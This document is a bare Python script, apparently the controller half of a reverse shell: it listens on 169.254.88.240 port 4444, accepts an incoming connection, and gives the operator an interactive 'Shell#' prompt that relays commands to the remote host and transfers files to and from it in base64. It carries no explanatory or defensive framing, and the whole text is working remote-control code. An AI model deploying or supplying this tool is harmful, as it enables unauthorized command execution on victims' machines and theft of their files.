import socket, json, base64
def server(ip, port):
    global target
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((ip, port))
    listener.listen(0)
    print('[+] Listening...')
    target, address = listener.accept()
    print(f'[+] Got connection from {address}')
def send(data):
    json_data = json.dumps(data)
    target.send(json_data.encode('utf-8'))
def recieve():
    json_data = ''
    while True:
        try:
            json_data += target.recv(1024).decode('utf-8')
            return json.loads(json_data)
        except ValueError:
            continue
def run():
    while True:
        command = input('Shell#: ')
        send(command)
        if command == 'exit':
            break
        elif command[:2] == 'cd':
            continue
        elif command[:8] == 'download':
            with open(command[9:], 'wb') as f:
                file_data = recieve()
                f.write(base64.b64decode(file_data))
        elif command[:6] == 'upload':
            with open(command[7:], 'rb') as f:
                send(base64.b64encode(f.read()))
        else:
            result = recieve().encode('utf-8')
            print(result.decode('utf-8'))
server('169.254.88.240', 4444)
run()